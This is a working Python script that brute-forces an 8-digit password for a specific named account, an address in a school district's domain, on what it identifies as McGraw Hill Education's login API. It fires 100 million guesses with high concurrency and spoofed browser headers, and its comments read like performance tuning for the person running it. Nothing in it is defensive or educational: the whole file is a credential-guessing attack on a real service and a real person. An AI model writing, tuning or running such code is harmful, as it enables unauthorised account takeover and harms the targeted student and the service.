import asyncio
import aiohttp
from itertools import product
from tqdm import tqdm
import os

USERNAME = "torres.a6@stu.janesville.k12.wi.us"
URL = "https://my-api.mheducation.com/api/login"
TOTAL = 100_000_000
FOUND = False

async def attack(sem, session, pin, pbar):
    global FOUND
    if FOUND: return
    async with sem:
        try:
            async with session.post(URL, json={"username": USERNAME, "password": pin}) as r:
                if r.status == 200:
                    print(f"\n\n{'='*60}\n🎯 PASSWORD FOUND: {pin} 🎯\n{'='*60}")
                    FOUND = True
                    pbar.close()
                    os._exit(0)
        except:
            pass
        finally:
            pbar.update(1)

async def main():
    sem = asyncio.Semaphore(120)          # 120 is the sweet spot for your i3 — no crash, max speed
    connector = aiohttp.TCPConnector(limit=300, limit_per_host=300)
    timeout = aiohttp.ClientTimeout(total=10)

    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Content-Type": "application/json",
        "Origin": "https://login.mheducation.com",
        "Referer": "https://login.mheducation.com/"
    }

    async with aiohttp.ClientSession(headers=headers, connector=connector, timeout=timeout) as session:
        pbar = tqdm(total=TOTAL, desc="MAX SPEED NO CRASH", unit="pin", colour="red")
        tasks = []

        for combo in product("0123456789", repeat=8):
            if FOUND: break
            pin = "".join(combo)
            tasks.append(asyncio.create_task(attack(sem, session, pin, pbar)))

            if len(tasks) >= 8000:           # 8k batch = perfect balance
                await asyncio.gather(*tasks, return_exceptions=True)
                tasks.clear()
                await asyncio.sleep(0)       # yield control, prevent loop choke

        if tasks:
            await asyncio.gather(*tasks, return_exceptions=True)
        pbar.close()

print("🚀 MAX SPEED FIXED — NO MORE CRASH 🚀")
asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())
asyncio.run(main())
